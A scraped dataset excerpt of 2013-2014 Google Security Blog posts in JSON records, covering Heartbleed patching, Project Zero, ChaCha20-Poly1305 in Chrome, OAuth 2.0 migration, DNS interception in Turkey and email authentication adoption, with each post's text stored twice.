breach is unknown.  The intermediate CA certificates held by NIC were revoked on July 3, as noted above. But a root CA is responsible for all certificates issued under its authority. In light of this, in a future Chrome release, we will limit the India CCA root certificate to the following domains and subdomains thereof in order to protect users:  gov.in nic.in ac.in rbi.org.in bankofindia.co.in ncode.in tcs.co.in           ", "date": "July 8, 2014"},
{"website": "Google-Security", "title": "\nStreet View and reCAPTCHA technology just got smarter \n", "author": ["Posted by Vinay Shet, Product Manager, reCAPTCHA "], "link": "https://security.googleblog.com/2014/04/street-view-and-recaptcha-technology.html", "abstract": "                             Posted by Vinay Shet, Product Manager, reCAPTCHA&nbsp;     Have you ever wondered how Google Maps knows the exact location of your neighborhood coffee shop? Or of the hotel you&#8217;re staying at next month? Translating a street address to an exact location on a map is harder than it seems. To take on this challenge and make Google Maps even more useful, we&#8217;ve been working on a new system to help locate addresses even more accurately, using some of the technology from the Street View and reCAPTCHA teams.    This technology finds and reads street numbers in Street View, and correlates those numbers with existing addresses to pinpoint their exact location on Google Maps. We&#8217;ve described these findings in a  scientific paper  at the  International Conference on Learning Representations (ICLR) . In this paper, we show that this system is able to accurately detect and read difficult numbers in Street View with 90% accuracy. &nbsp;                Street View numbers correctly identified by the algorithm      These findings have surprising implications for spam and abuse protection on the Internet as well. For more than a decade,  CAPTCHAs  have used visual puzzles in the form of distorted text to help webmasters prevent automated software from engaging in abusive activities on their sites. Turns out that this new algorithm can also be used to read CAPTCHA puzzles&#8212;we found that it can decipher the hardest distorted text puzzles from reCAPTCHA with over 99% accuracy. This shows that the act of typing in the answer to a distorted image should not be the only factor when it comes to determining a human versus a machine.    Fortunately, Google&#8217;s reCAPTCHA has taken this into consideration, and reCAPTCHA is more secure today than ever before. Last year, we  announced  that we&#8217;ve significantly reduced our dependence on text distortions as the main differentiator between human and machine, and instead perform advanced risk analysis. This has also allowed us to simplify both our text CAPTCHAs as well as our audio CAPTCHAs, so that getting through this security measure is easy for humans, but still keeps websites protected.               CAPTCHA images correctly solved by the algorithm      Thanks to this research, we know that relying on distorted text alone isn&#8217;t enough. However, it&#8217;s important to note that simply identifying the text in CAPTCHA puzzles correctly doesn&#8217;t mean that reCAPTCHA itself is broken or ineffective. On the contrary, these findings have helped us build additional safeguards against bad actors in reCAPTCHA.    As the Street View and reCAPTCHA teams continue to work closely together, both will continue to improve, making Maps more precise and useful and reCAPTCHA safer and more effective. For more information, check out the  reCAPTCHA site  and the  scientific paper  from  ICLR 2014 .                                   Posted by Vinay Shet, Product Manager, reCAPTCHA   Have you ever wondered how Google Maps knows the exact location of your neighborhood coffee shop? Or of the hotel you’re staying at next month? Translating a street address to an exact location on a map is harder than it seems. To take on this challenge and make Google Maps even more useful, we’ve been working on a new system to help locate addresses even more accurately, using some of the technology from the Street View and reCAPTCHA teams.  This technology finds and reads street numbers in Street View, and correlates those numbers with existing addresses to pinpoint their exact location on Google Maps. We’ve described these findings in a scientific paper at the International Conference on Learning Representations (ICLR). In this paper, we show that this system is able to accurately detect and read difficult numbers in Street View with 90% accuracy.    Street View numbers correctly identified by the algorithm  These findings have surprising implications for spam and abuse protection on the Internet as well. For more than a decade, CAPTCHAs have used visual puzzles in the form of distorted text to help webmasters prevent automated software from engaging in abusive activities on their sites. Turns out that this new algorithm can also be used to read CAPTCHA puzzles—we found that it can decipher the hardest distorted text puzzles from reCAPTCHA with over 99% accuracy. This shows that the act of typing in the answer to a distorted image should not be the only factor when it comes to determining a human versus a machine.  Fortunately, Google’s reCAPTCHA has taken this into consideration, and reCAPTCHA is more secure today than ever before. Last year, we announced that we’ve significantly reduced our dependence on text distortions as the main differentiator between human and machine, and instead perform advanced risk analysis. This has also allowed us to simplify both our text CAPTCHAs as well as our audio CAPTCHAs, so that getting through this security measure is easy for humans, but still keeps websites protected.   CAPTCHA images correctly solved by the algorithm  Thanks to this research, we know that relying on distorted text alone isn’t enough. However, it’s important to note that simply identifying the text in CAPTCHA puzzles correctly doesn’t mean that reCAPTCHA itself is broken or ineffective. On the contrary, these findings have helped us build additional safeguards against bad actors in reCAPTCHA.  As the Street View and reCAPTCHA teams continue to work closely together, both will continue to improve, making Maps more precise and useful and reCAPTCHA safer and more effective. For more information, check out the reCAPTCHA site and the scientific paper from ICLR 2014.     ", "date": "April 16, 2014"},
{"website": "Google-Security", "title": "\nMaking end-to-end encryption easier to use\n", "author": [], "link": "https://security.googleblog.com/2014/06/making-end-to-end-encryption-easier-to.html", "abstract": "                             posted by Stephan Somogyi, Product Manager, Security and Privacy               Your security online has always been a top priority for us, and we&#8217;re constantly working to make sure your data is safe. For example, Gmail supported  HTTPS  when it first launched and now  always uses an encrypted connection  when you check or send email in your browser. We warn people  in Gmail  and  Chrome  when we have reason to believe they&#8217;re being targeted by bad actors. We also alert you to  malware and phishing  when we find it.    Today, we&#8217;re adding to that list the alpha version of a new tool. It&#8217;s called  End-to-End  and it&#8217;s a Chrome extension intended for users who need additional security beyond what we already provide.    &#8220;End-to-end&#8221; encryption means data leaving your browser will be encrypted until the message&#8217;s intended recipient decrypts it, and that similarly encrypted messages sent to you will remain that way until you decrypt them in your browser.           While end-to-end encryption tools like  PGP  and  GnuPG  have been around for a long time, they require a great deal of technical know-how and manual effort to use. To help make this kind of encryption a bit easier, we&#8217;re releasing  code  for a new Chrome extension that uses  OpenPGP , an open standard supported by many existing encryption tools.    However, you won&#8217;t find the End-to-End extension in the  Chrome Web Store  quite yet; we&#8217;re just sharing the code today so that the community can test and evaluate it, helping us make sure that it&#8217;s as secure as it needs to be before people start relying on it. (And we mean it: our  Vulnerability Reward Program  offers financial awards for finding security bugs in Google code, including End-to-End.)    Once we feel that the extension is ready for primetime, we&#8217;ll make it available in the  Chrome Web Store , and anyone will be able to use it to send and receive end-to-end encrypted emails through their existing web-based email provider.    We recognize that this sort of encryption will probably only be used for very sensitive messages or by those who need added protection. But we hope that the End-to-End extension will make it quicker and easier for people to get that extra layer of security should they need it.    You can find more technical details describing how we've architected and implemented End-to-End  here .                                   posted by Stephan Somogyi, Product Manager, Security and Privacy     Your security online has always been a top priority for us, and we’re constantly working to make sure your data is safe. For example, Gmail supported HTTPS when it first launched and now always uses an encrypted connection when you check or send email in your browser. We warn people in Gmail and Chrome when we have reason to believe they’re being targeted by bad actors. We also alert you to malware and phishing when we find it.  Today, we’re adding to that list the alpha version of a new tool. It’s called End-to-End and it’s a Chrome extension intended for users who need additional security beyond what we already provide.  “End-to-end” encryption means data leaving your browser will be encrypted until the message’s intended recipient decrypts it, and that similarly encrypted messages sent to you will remain that way until you decrypt them in your browser.    While end-to-end encryption tools like PGP and GnuPG have been around for a long time, they require a great deal of technical know-how and manual effort to use. To help make this kind of encryption a bit easier, we’re releasing code for a new Chrome extension that uses OpenPGP, an open standard supported by many existing encryption tools.  However, you won’t find the End-to-End extension in the Chrome Web Store quite yet; we’re just sharing the code today so that the community can test and evaluate it, helping us make sure that it’s as secure as it needs to be before people start relying on it. (And we mean it: our Vulnerability Reward Program offers financial awards for finding security bugs in Google code, including End-to-End.)  Once we feel that the extension is ready for primetime, we’ll make it available in the Chrome Web Store, and anyone will be able to use it to send and receive end-to-end encrypted emails through their existing web-based email provider.  We recognize that this sort of encryption will probably only be used for very sensitive messages or by those who need added protection. But we hope that the End-to-End extension will make it quicker and easier for people to get that extra layer of security should they need it.  You can find more technical details describing how we've architected and implemented End-to-End here.     ", "date": "June 3, 2014"},
{"website": "Google-Security", "title": "\nNew Security Measures Will Affect Older (non-OAuth 2.0) Applications \n", "author": ["Posted by Antonio Fuentes, Product Manager, Google Identity Team"], "link": "https://security.googleblog.com/2014/04/new-security-measures-will-affect-older.html", "abstract": "                             Posted by Antonio Fuentes, Product Manager, Google Identity Team     There is nothing more important than making sure our users and their information stay safe online. Doing that means providing security features at the user-level like 2-Step Verification and recovery options, and also involves a lot of work behind the scenes, both at Google and with developers like you. We've already implemented developer tools including  Google Sign-In  and support for  OAuth 2.0 in Google APIs  and IMAP, SMTP and XMPP, and we&#8217;re always looking to raise the bar.    That's why, beginning in the second half of 2014, we'll start gradually increasing the security checks performed when users log in to Google. These additional checks will ensure that only the intended user has access to their account, whether through a browser, device or application. These changes will affect any application that sends a username and/or password to Google.    To better protect your users, we recommend you upgrade all of your applications to OAuth 2.0. If you choose not to do so, your users will be required to take extra steps in order to keep accessing your applications.    The standard Internet protocols we support all work with OAuth 2.0, as do most of our APIs. We leverage the work done by the IETF on OAuth 2.0 integration with IMAP, SMTP, POP, XMPP, CalDAV, and CardDAV.    In summary, if your application currently uses plain passwords to authenticate to Google, we strongly encourage you to minimize user disruption by switching to  OAuth 2.0 .                                        Posted by Antonio Fuentes, Product Manager, Google Identity Team  There is nothing more important than making sure our users and their information stay safe online. Doing that means providing security features at the user-level like 2-Step Verification and recovery options, and also involves a lot of work behind the scenes, both at Google and with developers like you. We've already implemented developer tools including Google Sign-In and support for OAuth 2.0 in Google APIs and IMAP, SMTP and XMPP, and we’re always looking to raise the bar.  That's why, beginning in the second half of 2014, we'll start gradually increasing the security checks performed when users log in to Google. These additional checks will ensure that only the intended user has access to their account, whether through a browser, device or application. These changes will affect any application that sends a username and/or password to Google.  To better protect your users, we recommend you upgrade all of your applications to OAuth 2.0. If you choose not to do so, your users will be required to take extra steps in order to keep accessing your applications.  The standard Internet protocols we support all work with OAuth 2.0, as do most of our APIs. We leverage the work done by the IETF on OAuth 2.0 integration with IMAP, SMTP, POP, XMPP, CalDAV, and CardDAV.  In summary, if your application currently uses plain passwords to authenticate to Google, we strongly encourage you to minimize user disruption by switching to OAuth 2.0.         ", "date": "April 23, 2014"},
{"website": "Google-Security", "title": "\nAnnouncing Project Zero\n", "author": [], "link": "https://security.googleblog.com/2014/07/announcing-project-zero.html", "abstract": "                             Posted by Chris Evans, Researcher Herder          Security is a top priority for Google. We've invested a lot in making our products secure, including  strong SSL encryption by default  for Search, Gmail and Drive, as well as encrypting data moving between our data centers. Beyond securing our own products, interested Googlers also spend some of their time on  research that makes the Internet safer , leading to the discovery of bugs like Heartbleed.         The success of that part-time research has led us to create a new, well-staffed team called Project Zero.         You should be able to use the web without fear that a criminal or state-sponsored actor is exploiting software bugs to infect your computer, steal secrets or monitor your communications. Yet in sophisticated attacks, we see the use of  \"zero-day\" vulnerabilities  to target, for example,  human rights activists  or to conduct  industrial espionage . This needs to stop. We think more can be done to tackle this problem.         Project Zero is our contribution, to start the ball rolling. Our objective is to significantly reduce the number of people harmed by targeted attacks. We're hiring the best practically-minded security researchers and contributing 100% of their time toward improving security across the Internet.         We're not placing any particular bounds on this project and will work to improve the security of  any  software depended upon by large numbers of people, paying careful attention to the techniques, targets and motivations of attackers. We'll use standard approaches such as locating and reporting large numbers of vulnerabilities. In addition, we'll be conducting new research into mitigations, exploitation, program analysis&#8212;and anything else that our researchers decide is a worthwhile investment.         We commit to doing our work transparently. Every bug we discover will be filed in an  external database . We will only report bugs to the software's vendor&#8212;and no third parties. Once the bug report becomes public (typically once a patch is available), you'll be able to monitor vendor time-to-fix performance, see any discussion about exploitability, and view historical exploits and crash traces. We also commit to sending bug reports to vendors in as close to real-time as possible, and to working with them to get fixes to users in a reasonable time.         We're hiring. We believe that most security researchers do what they do because they love what they do. What we offer that we think is new is a place to do what you love&#8212;but in the open and without distraction. We'll also be looking at ways to involve the wider community, such as extensions of our popular reward initiatives and guest blog posts. As we find things that are particularly interesting, we'll discuss them on  our blog , which we hope you'll follow.                                     Posted by Chris Evans, Researcher Herder    Security is a top priority for Google. We've invested a lot in making our products secure, including strong SSL encryption by default for Search, Gmail and Drive, as well as encrypting data moving between our data centers. Beyond securing our own products, interested Googlers also spend some of their time on research that makes the Internet safer, leading to the discovery of bugs like Heartbleed.    The success of that part-time research has led us to create a new, well-staffed team called Project Zero.    You should be able to use the web without fear that a criminal or state-sponsored actor is exploiting software bugs to infect your computer, steal secrets or monitor your communications. Yet in sophisticated attacks, we see the use of \"zero-day\" vulnerabilities to target, for example, human rights activists or to conduct industrial espionage. This needs to stop. We think more can be done to tackle this problem.    Project Zero is our contribution, to start the ball rolling. Our objective is to significantly reduce the number of people harmed by targeted attacks. We're hiring the best practically-minded security researchers and contributing 100% of their time toward improving security across the Internet.    We're not placing any particular bounds on this project and will work to improve the security of any software depended upon by large numbers of people, paying careful attention to the techniques, targets and motivations of attackers. We'll use standard approaches such as locating and reporting large numbers of vulnerabilities. In addition, we'll be conducting new research into mitigations, exploitation, program analysis—and anything else that our researchers decide is a worthwhile investment.    We commit to doing our work transparently. Every bug we discover will be filed in an external database. We will only report bugs to the software's vendor—and no third parties. Once the bug report becomes public (typically once a patch is available), you'll be able to monitor vendor time-to-fix performance, see any discussion about exploitability, and view historical exploits and crash traces. We also commit to sending bug reports to vendors in as close to real-time as possible, and to working with them to get fixes to users in a reasonable time.    We're hiring. We believe that most security researchers do what they do because they love what they do. What we offer that we think is new is a place to do what you love—but in the open and without distraction. We'll also be looking at ways to involve the wider community, such as extensions of our popular reward initiatives and guest blog posts. As we find things that are particularly interesting, we'll discuss them on our blog, which we hope you'll follow.     ", "date": "July 15, 2014"},
{"website": "Google-Security", "title": "\nSpeeding up and strengthening HTTPS connections for Chrome on Android\n", "author": ["Posted by Elie Bursztein, Anti-Abuse Research Lead"], "link": "https://security.googleblog.com/2014/04/speeding-up-and-strengthening-https.html", "abstract": "                             Posted by Elie Bursztein, Anti-Abuse Research Lead     Earlier this year, we deployed a new TLS cipher suite in Chrome that operates three times faster than AES-GCM on devices that don&#8217;t have AES hardware acceleration, including most Android phones, wearable devices such as Google Glass and older computers. This improves user experience, reducing latency and saving battery life by cutting down the amount of time spent encrypting and decrypting data.      To make this happen, Adam Langley, Wan-Teh Chang, Ben Laurie and I began implementing new algorithms -- ChaCha 20 for symmetric encryption and Poly1305 for authentication --  in OpenSSL and NSS in March 2013. It was a complex effort that required implementing a new abstraction layer in OpenSSL in order to support the Authenticated Encryption with Associated Data (AEAD) encryption mode properly. AEAD enables encryption and authentication to happen concurrently, making it easier to use and optimize than older, commonly-used modes such as CBC. Moreover,  recent attacks  against RC4 and CBC also prompted us to make this change.      The benefits of this new cipher suite include:     Better security: ChaCha20 is immune to padding-oracle attacks, such as the Lucky13, which affect CBC mode as used in TLS. By design, ChaCha20 is also immune to timing attacks. Check out a detailed description of TLS ciphersuites weaknesses in our earlier  post .   Better performance: ChaCha20 and Poly1305 are very fast on mobile and wearable devices, as their designs are able to leverage common CPU instructions, including ARM vector instructions. Poly1305 also saves network bandwidth, since its output is only 16 bytes compared to HMAC-SHA1, which is 20 bytes. This represents a 16% reduction of the TLS network overhead incurred when using older ciphersuites such as RC4-SHA or AES-SHA. The expected acceleration compared to AES-GCM for various platforms is summarized in the chart below.                        As of February 2014, almost all HTTPS  connections made from Chrome browsers on Android devices to Google properties have used this new cipher suite. We plan to make it available as part of the Android platform in a future release. If you&#8217;d like to verify which cipher suite Chrome is currently using, on an Android device or on desktop, just click on the padlock in the URL bar and look at the connection tab. If Chrome is using ChaCha20-Poly1305 you will see the following information:             ChaCha20 and Poly1305 were designed by Prof. Dan Bernstein from the University of Illinois at Chicago. The simple and efficient design of these algorithms combined with the extensive vetting they received from the scientific community make us confident that these algorithms will bring the security and speed needed to secure mobile communication. Moreover, selecting algorithms that are free for everyone to use is also in line with our commitment to openness and transparency.    We would like to thank the people who made this possible: Dan Bernstein who invented and implemented both ChaCha/20 and Poly1305, Andrew Moon for his open-source implementation of Poly1305, Ted Krovetz for his open-source implementation of ChaCha20 and Peter Schwabe for his implementation work. We hope there will be even  greater adoption  of this cipher suite, and look forward to seeing other websites deprecate AES-SHA1 and RC4-SHA1 in favor of AES-GCM and ChaCha20-Poly1305 since they offer safer and faster alternatives. IETF draft standards for this cipher suite are available  here  and  here .                                   Posted by Elie Bursztein, Anti-Abuse Research Lead  Earlier this year, we deployed a new TLS cipher suite in Chrome that operates three times faster than AES-GCM on devices that don’t have AES hardware acceleration, including most Android phones, wearable devices such as Google Glass and older computers. This improves user experience, reducing latency and saving battery life by cutting down the amount of time spent encrypting and decrypting data.    To make this happen, Adam Langley, Wan-Teh Chang, Ben Laurie and I began implementing new algorithms -- ChaCha 20 for symmetric encryption and Poly1305 for authentication --  in OpenSSL and NSS in March 2013. It was a complex effort that required implementing a new abstraction layer in OpenSSL in order to support the Authenticated Encryption with Associated Data (AEAD) encryption mode properly. AEAD enables encryption and authentication to happen concurrently, making it easier to use and optimize than older, commonly-used modes such as CBC. Moreover, recent attacks against RC4 and CBC also prompted us to make this change.    The benefits of this new cipher suite include:  Better security: ChaCha20 is immune to padding-oracle attacks, such as the Lucky13, which affect CBC mode as used in TLS. By design, ChaCha20 is also immune to timing attacks. Check out a detailed description of TLS ciphersuites weaknesses in our earlier post. Better performance: ChaCha20 and Poly1305 are very fast on mobile and wearable devices, as their designs are able to leverage common CPU instructions, including ARM vector instructions. Poly1305 also saves network bandwidth, since its output is only 16 bytes compared to HMAC-SHA1, which is 20 bytes. This represents a 16% reduction of the TLS network overhead incurred when using older ciphersuites such as RC4-SHA or AES-SHA. The expected acceleration compared to AES-GCM for various platforms is summarized in the chart below.         As of February 2014, almost all HTTPS  connections made from Chrome browsers on Android devices to Google properties have used this new cipher suite. We plan to make it available as part of the Android platform in a future release. If you’d like to verify which cipher suite Chrome is currently using, on an Android device or on desktop, just click on the padlock in the URL bar and look at the connection tab. If Chrome is using ChaCha20-Poly1305 you will see the following information:     ChaCha20 and Poly1305 were designed by Prof. Dan Bernstein from the University of Illinois at Chicago. The simple and efficient design of these algorithms combined with the extensive vetting they received from the scientific community make us confident that these algorithms will bring the security and speed needed to secure mobile communication. Moreover, selecting algorithms that are free for everyone to use is also in line with our commitment to openness and transparency.  We would like to thank the people who made this possible: Dan Bernstein who invented and implemented both ChaCha/20 and Poly1305, Andrew Moon for his open-source implementation of Poly1305, Ted Krovetz for his open-source implementation of ChaCha20 and Peter Schwabe for his implementation work. We hope there will be even greater adoption of this cipher suite, and look forward to seeing other websites deprecate AES-SHA1 and RC4-SHA1 in favor of AES-GCM and ChaCha20-Poly1305 since they offer safer and faster alternatives. IETF draft standards for this cipher suite are available here and here.     ", "date": "April 24, 2014"},
{"website": "Google-Security", "title": "\nGoogle Services Updated to Address OpenSSL CVE-2014-0160  (the Heartbleed bug)\n", "author": ["Posted by Matthew O'Connor, Product Manager"], "link": "https://security.googleblog.com/2014/04/google-services-updated-to-address.html", "abstract": "                             Posted by Matthew O'Connor, Product Manager        You may have heard of &#8220;Heartbleed,&#8221; a flaw in OpenSSL that could allow the theft of data normally protected by SSL/TLS encryption.   We&#8217;ve assessed this vulnerability and applied patches to key Google services such as Search, Gmail, YouTube, Wallet, Play, Drive, Apps, App Engine,  AdWords, DoubleClick, Maps, Maps Engine, Earth, Analytics and Tag Manager . &nbsp;Google Chrome and Chrome OS are not affected.   We are still working to patch some other Google services. We regularly and proactively look for vulnerabilities like this --    and encourage others to report them    -- so that that we can fix software flaws before they are exploited.&nbsp;        If you are a Google Cloud Platform or Google Search Appliance customer, or don&#8217;t use the latest version of Android, here is what you need to know:        Cloud SQL    We are currently patching Cloud SQL, with the patch rolling out to all instances today and tomorrow.  In the meantime, users should use the IP whitelisting function to ensure that only known hosts can access their instances. Please find    instructions here   .        Google Compute Engine       Customers need to manually update OpenSSL on each running instance or should replace any existing images with versions including an updated OpenSSL. Once updated, each instance should be rebooted to ensure all running processes are using the updated SSL library. Please find    instructions here  .        Google Search Appliance (GSA)       Engineers have patched GSA and issued notices to customers. More information is available in the    Google Enterprise Support Portal   .         Android      All versions of Android are immune to CVE-2014-0160 (with the limited exception of Android 4.1.1; patching information for Android 4.1.1 is being distributed to Android partners).        We will continue working closely with the security research and open source communities, as doing so is one of the best ways we know to keep our users safe.        Apr 12  : Updated to add Google AdWords, DoubleClick, Maps, Maps Engine and Earth to the list of Google services that were patched early, but inadvertently left out at the time of original posting.      Apr 14  : In light of new research on extracting keys using the Heartbleed bug, we are recommending that Google Compute Engine (GCE) customers create new keys for any affected SSL services. Google Search Appliance (GSA) customers should also consider creating new keys after patching their GSA. Engineers are working on a patch for the GSA, and the  Google Enterprise Support Portal &nbsp;will be updated with the patch as soon as it is available.    Also updated to add Google Analytics and Tag Manager to the list of Google services that were patched early, but inadvertently left out at the time of original posting.      Apr 16:   Updated to include information about GSA patch.      Apr 28:&nbsp;  Updated to add Google Drive, which was patched early but inadvertently left out at the time of original posting.                                   Posted by Matthew O'Connor, Product Manager  You may have heard of “Heartbleed,” a flaw in OpenSSL that could allow the theft of data normally protected by SSL/TLS encryption. We’ve assessed this vulnerability and applied patches to key Google services such as Search, Gmail, YouTube, Wallet, Play, Drive, Apps, App Engine, AdWords, DoubleClick, Maps, Maps Engine, Earth, Analytics and Tag Manager.  Google Chrome and Chrome OS are not affected. We are still working to patch some other Google services. We regularly and proactively look for vulnerabilities like this -- and encourage others to report them -- so that that we can fix software flaws before they are exploited.   If you are a Google Cloud Platform or Google Search Appliance customer, or don’t use the latest version of Android, here is what you need to know:  Cloud SQL We are currently patching Cloud SQL, with the patch rolling out to all instances today and tomorrow.  In the meantime, users should use the IP whitelisting function to ensure that only known hosts can access their instances. Please find instructions here.  Google Compute Engine  Customers need to manually update OpenSSL on each running instance or should replace any existing images with versions including an updated OpenSSL. Once updated, each instance should be rebooted to ensure all running processes are using the updated SSL library. Please find instructions here.  Google Search Appliance (GSA)  Engineers have patched GSA and issued notices to customers. More information is available in the Google Enterprise Support Portal.  Android  All versions of Android are immune to CVE-2014-0160 (with the limited exception of Android 4.1.1; patching information for Android 4.1.1 is being distributed to Android partners).  We will continue working closely with the security research and open source communities, as doing so is one of the best ways we know to keep our users safe.   Apr 12: Updated to add Google AdWords, DoubleClick, Maps, Maps Engine and Earth to the list of Google services that were patched early, but inadvertently left out at the time of original posting.  Apr 14: In light of new research on extracting keys using the Heartbleed bug, we are recommending that Google Compute Engine (GCE) customers create new keys for any affected SSL services. Google Search Appliance (GSA) customers should also consider creating new keys after patching their GSA. Engineers are working on a patch for the GSA, and the Google Enterprise Support Portal will be updated with the patch as soon as it is available.  Also updated to add Google Analytics and Tag Manager to the list of Google services that were patched early, but inadvertently left out at the time of original posting.  Apr 16: Updated to include information about GSA patch.  Apr 28: Updated to add Google Drive, which was patched early but inadvertently left out at the time of original posting.     ", "date": "April 9, 2014"},
{"website": "Google-Security", "title": "\nGoogle’s Public DNS intercepted in Turkey\n", "author": ["Posted by Steven Carstensen, Software Engineer"], "link": "https://security.googleblog.com/2014/03/googles-public-dns-intercepted-in-turkey.html", "abstract": "                             Posted by Steven Carstensen, Software Engineer        We have received several credible reports and confirmed with our own research that Google&#8217;s Domain Name System (DNS) service has been intercepted by most Turkish ISPs (Internet Service Providers).    A DNS server tells your computer the address of a server it&#8217;s looking for, in the same way that you might look up a phone number in a phone book. Google operates DNS servers because we believe that you should be able to quickly and securely make your way to whatever host you&#8217;re looking for, be it  YouTube , Twitter, or any other.    But imagine if someone had changed out your phone book with another one, which looks pretty much the same as before, except that the listings for a few people showed the wrong phone number. That&#8217;s essentially what&#8217;s happened: Turkish ISPs have set up servers that masquerade as Google&#8217;s DNS service.                                    Posted by Steven Carstensen, Software Engineer   We have received several credible reports and confirmed with our own research that Google’s Domain Name System (DNS) service has been intercepted by most Turkish ISPs (Internet Service Providers).  A DNS server tells your computer the address of a server it’s looking for, in the same way that you might look up a phone number in a phone book. Google operates DNS servers because we believe that you should be able to quickly and securely make your way to whatever host you’re looking for, be it YouTube, Twitter, or any other.  But imagine if someone had changed out your phone book with another one, which looks pretty much the same as before, except that the listings for a few people showed the wrong phone number. That’s essentially what’s happened: Turkish ISPs have set up servers that masquerade as Google’s DNS service.     ", "date": "March 29, 2014"},
{"website": "Google-Security", "title": "\nInternet-wide efforts to fight email phishing are working\n", "author": ["Posted by Elie Bursztein, anti-abuse research lead and Vijay Eranti, Gmail anti-abuse technical lead"], "link": "https://security.googleblog.com/2013/12/internet-wide-efforts-to-fight-email.html", "abstract": "                             Posted by Elie Bursztein, anti-abuse research lead and Vijay Eranti, Gmail anti-abuse technical lead        Editor's Note:  This post was updated on February 9th, 2016. Adoption numbers reflect state of authentication as of this date.     Since 2004, industry groups and standards bodies have been working on developing and deploying email authentication standards to prevent email impersonation. At its core, email authentication standardizes how an email&#8217;s sending and receiving domains can exchange information to authenticate that the email came from the rightful sender.    Now, nearly a decade later, adoption of these standards is widespread across the industry, dramatically reducing spammers&#8217; ability to impersonate domains that users trust, and making email phishing less effective. 97.4% of non-spam emails sent to Gmail users come from authenticated senders as of 2016, a sharp increase from 2013 when only 91.4% of the emails were authenticated. Authentication helps Gmail prevent billions of impersonating email messages a year landing in users&#8217; inboxes.     More specifically, the 97.4% of the authenticated non-spam emails sent to Gmail users come from senders that have adopted one or more of the following email authentication standards: DKIM (DomainKey Identified Email) or SPF (Sender Policy Framework).                 Here are some statistics that illustrate the scale of what we&#8217;re seeing:       86.8% of the emails we received are signed according to the (DKIM) standard (up from 76.9% in 2013). Over two million domains (weekly active) have adopted this standard (up from 0.5 millions 2013).&nbsp;   95.3% of incoming emails we receive come from SMTP servers that are authenticated using the SPF standard (up from 89.1% in 2013). Over 7.8 million domains (weekly active) have adopted the SPF standard (up from 3.5 million domains in 2013).   85% of incoming emails we receive are protected by both the DKIM and SPF standards (up from 74.7% in 2013).   Over 162,000 domains have deployed domain-wide policies that allow us to reject hundreds of millions of unauthenticated emails every week via the DMARC standard (up from 80,000 in 2013).&nbsp;     Join the fight against email spam&nbsp;     As more domains implement authentication, phishers are forced to target domains that are not yet protected. If you own a domain that sends email, the most effective action you can take to help us and prevent spammers from impersonating your domain is to set up DKIM, SPF and DMARC. Check our help pages on  DKIM ,  SPF ,  DMARC  to get started.    When using DKIM, please make sure that your public key is at least 1024 bits, so that attackers can&#8217;t crack it and impersonate your domain. The use of weak cryptographic keys -- ones that are 512 bits or less -- is one of the major sources of DKIM configuration errors (21%).    If you own domains that are never used to send email, you can still help prevent abuse. All you need to do is create a DMARC policy that describes your domain as a non-sender. Adding a &#8220;reject&#8221; policy for these domains ensures that no emails impersonating you will ever reach Gmail users&#8217; inboxes.    While the fight against spammers is far from over, it&#8217;s nevertheless encouraging to see that community efforts are paying off. Gmail has been an early adopter of these standards and we remain a strong advocate of email authentication.  We hope that publishing these results will inspire more domain owners to adopt the standards that protect them from impersonation and help keep email inboxes safe and clean.                                   Posted by Elie Bursztein, anti-abuse research lead and Vijay Eranti, Gmail anti-abuse technical lead Editor's Note: This post was updated on February 9th, 2016. Adoption numbers reflect state of authentication as of this date.  Since 2004, industry groups and standards bodies have been working on developing and deploying email authentication standards to prevent email impersonation. At its core, email authentication standardizes how an email’s sending and receiving domains can exchange information to authenticate that the email came from the rightful sender.  Now, nearly a decade later, adoption of these standards is widespread across the industry, dramatically reducing spammers’ ability to impersonate domains that users trust, and making email phishing less effective. 97.4% of non-spam emails sent to Gmail users come from authenticated senders as of 2016, a sharp increase from 2013 when only 91.4% of the emails were authenticated. Authentication helps Gmail prevent billions of impersonating email messages a year landing in users’ inboxes.   More specifically, the 97.4% of the authenticated non-spam emails sent to Gmail users come from senders that have adopted one or more of the following email authentication standards: DKIM (DomainKey Identified Email) or SPF (Sender Policy Framework).       Here are some statistics that illustrate the scale of what we’re seeing:   86.8% of the emails we received are signed according to the (DKIM) standard (up from 76.9% in 2013). Over two million domains (weekly active) have adopted this standard (up from 0.5 millions 2013).  95.3% of incoming emails we receive come from SMTP servers that are authenticated using the SPF standard (up from 89.1% in 2013). Over 7.8 million domains (weekly active) have adopted the SPF standard (up from 3.5 million domains in 2013). 85% of incoming emails we receive are protected by both the DKIM and SPF standards (up from 74.7% in 2013). Over 162,000 domains have deployed domain-wide policies that allow us to reject hundreds of millions of unauthenticated emails every week via the DMARC standard (up from 80,000 in 2013).   Join the fight against email spam   As more domains implement authentication, phishers are forced to target domains that are not yet protected. If you own a domain that sends email, the most effective action you can take to help us and prevent spammers from impersonating your domain is to set up DKIM, SPF and DMARC. Check our help pages on DKIM, SPF, DMARC to get started.  When using DKIM, please make sure that your public key is at least 1024 bits, so that attackers can’t crack it and impersonate your domain. The use of weak cryptographic keys -- ones that are 512 bits or less -- is one of the major sources of DKIM configuration errors (21%).  If you own domains that are never used to send email, you can still help prevent abuse. All you need to do is create a DMARC policy that describes your domain as a non-sender. Adding a “reject” policy for these domains ensures that no emails impersonating you will ever reach Gmail users’ inboxes.  While the fight against spammers is far from over, it’s nevertheless encouraging to see that community efforts are paying off. Gmail has been an early adopter of these standards and we remain a strong advocate of email authentication.  We hope that publishing these results will inspire more domain owners to adopt the standards that protect them from impersonation and help keep email inboxes safe and clean.     ", "date": "December 6, 2013"},
{"website": "Google-Security", "title": "\nIf you could tell a user three things to do to stay safe online, what would they be?\n", "author": ["Posted by Rob Reeder, User Experience Research Team"], "link": "https://security.googleblog.com/2014/03/if-you-could-tell-user-three-things-to.html", "abstract": "                             Posted by Rob Reeder, User Experience Research Team     At Google, we&#8217;re constantly trying to improve security for our users. Besides the many technical security features we build, our efforts include educating users with advice about what they can do to stay safe online. Our  Safety Center  is a great example of this. But we&#8217;re always trying to do better and have been looking for ways to improve how we provide security advice to users.    That&#8217;s why we&#8217;ve started a research project to try to pare down existing security advice to a small set of things we can realistically expect our users to do to stay safe online. As part of this project, we are currently running a survey of security experts to see what advice they think is most important.    If you work in security, we&#8217;d really appreciate your input.   Please take our survey here:  goo.gl/F4fJ59 .&nbsp;     With your input we can draw on our collective expertise to get closer to an optimal set of advice that users can realistically follow, and thus, be safer online. Thanks!                                    Posted by Rob Reeder, User Experience Research Team  At Google, we’re constantly trying to improve security for our users. Besides the many technical security features we build, our efforts include educating users with advice about what they can do to stay safe online. Our Safety Center is a great example of this. But we’re always trying to do better and have been looking for ways to improve how we provide security advice 